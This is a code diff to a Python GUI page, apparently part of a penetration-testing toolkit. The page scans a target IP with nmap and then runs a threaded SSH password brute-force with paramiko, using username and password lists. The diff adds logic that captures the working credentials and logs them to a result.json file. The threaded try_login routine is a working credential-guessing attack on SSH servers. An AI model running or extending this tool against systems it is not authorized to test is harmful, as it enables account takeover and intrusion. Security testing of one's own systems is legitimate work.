@@ -6,12 +6,16 @@ import os
 import paramiko
 import threading
 import time
+import json
 
 
 class SSHPage(ctk.CTkFrame):
     def __init__(self, parent, controller):
         super().__init__(parent)
         self.controller = controller
+        self.username_list_button = None
+        self.password_list_button = None
+        self.connect_button = None
         self.setup_ui()
 
         self.is_request_pending = False
@@ -59,7 +63,7 @@ class SSHPage(ctk.CTkFrame):
         try:
             ipaddress.ip_address(ip)  # Validate IP
             self.ports_and_services = self.scan_with_nmap(ip)
-            self.handle_services(ip)
+            self.handle_services()
         except ValueError:
             self.show_error_message("Incorrect/unreachable IP!", self.canvas)
 
@@ -77,7 +81,7 @@ class SSHPage(ctk.CTkFrame):
                 ports_services[port] = service
         return ports_services
 
-    def handle_services(self, ip):
+    def handle_services(self):
         ssh_found = False
         for port, service in self.ports_and_services.items():
             if "ssh" in service.lower():
@@ -90,12 +94,17 @@ class SSHPage(ctk.CTkFrame):
             self.show_error_message("No SSH service found on this target!", self.canvas)
 
     def show_ssh_buttons(self):
-        self.username_list_button = ctk.CTkButton(self.canvas, text="Select Username List", command=lambda: self.select_list("username"))
-        self.username_list_button.pack(padx=10, pady=5)
-        self.password_list_button = ctk.CTkButton(self.canvas, text="Select Password List", command=lambda: self.select_list("password"))
-        self.password_list_button.pack(padx=10, pady=5)
-        self.connect_button = ctk.CTkButton(self.canvas, text="Initiate SSH Connection", command=self.initiate_connection)
-        self.connect_button.pack(padx=10, pady=5)
+        if not self.username_list_button:
+            self.username_list_button = ctk.CTkButton(self.canvas, text="Select Username List", command=lambda: self.select_list("username"))
+            self.username_list_button.pack(padx=10, pady=5)
+        
+        if not self.password_list_button:
+            self.password_list_button = ctk.CTkButton(self.canvas, text="Select Password List", command=lambda: self.select_list("password"))
+            self.password_list_button.pack(padx=10, pady=5)
+        
+        if not self.connect_button:
+            self.connect_button = ctk.CTkButton(self.canvas, text="Initiate SSH Connection", command=self.initiate_connection)
+            self.connect_button.pack(padx=10, pady=5)
 
     def initiate_connection(self):
         if self.selected_username_list and self.selected_password_list and self.ssh_port:
@@ -149,17 +158,19 @@ class SSHPage(ctk.CTkFrame):
             passwords = file.read().splitlines()
 
         success_flag = threading.Event()
+        self.successful_credentials = None
         semaphore = threading.Semaphore(5)
 
         def try_login(username, password):
-            if success_flag.is_set():  # Vérifie si une connexion a déjà réussi
+            if success_flag.is_set():  # Check right at the beginning
                 return
-            with semaphore:
+            with semaphore:  # Acquire semaphore to limit concurrent threads
                 local_client = paramiko.SSHClient()
                 local_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
                     local_client.connect(ip, port=port, username=username, password=password, timeout=10)
                     print(f"SSH connection successful on port {port} with {username}/{password}")
+                    self.successful_credentials = f"{username}/{password}"
                     success_flag.set()
                 except paramiko.AuthenticationException:
                     print(f"Failed to connect via SSH on port {port} with {username}/{password}")
@@ -167,7 +178,6 @@ class SSHPage(ctk.CTkFrame):
                     print(f"SSH Error on port {port}: {e}")
                 finally:
                     local_client.close()
-
         # Limiter le nombre de connexions simultanées
         
         threads = []
@@ -184,10 +194,31 @@ class SSHPage(ctk.CTkFrame):
             thread.join()
 
         if success_flag.is_set():
+            result_details = f"SSH connection successful with {self.successful_credentials}"
             print("Successful authentication detected, stopping all other attempts.")
         else:
-            print("SSH test completed for all username/password combinations on port {port}.")
+            result_details = "No successful SSH connection found."
+            print(result_details)
 
+        self.update_json(ip, result_details)
+
+    def update_json(self, ip, result_details):
+        json_path = os.path.join(os.getcwd(), 'result.json')
+        data = {}
+        if os.path.exists(json_path):
+            with open(json_path, 'r') as file:
+                data = json.load(file)
+
+        data[ip] = data.get(ip, {})
+        data[ip]['ssh_brute_force'] = {
+            "username_list": self.selected_username_list,
+            "password_list": self.selected_password_list,
+            "port": self.ssh_port,
+            "result": result_details
+        }
+
+        with open(json_path, 'w') as file:
+            json.dump(data, file, indent=4)
 
     def show_error_message(self, message, canvas):
         label_error = ctk.CTkLabel(canvas, text=message, text_color="Red", font=(None, 11))
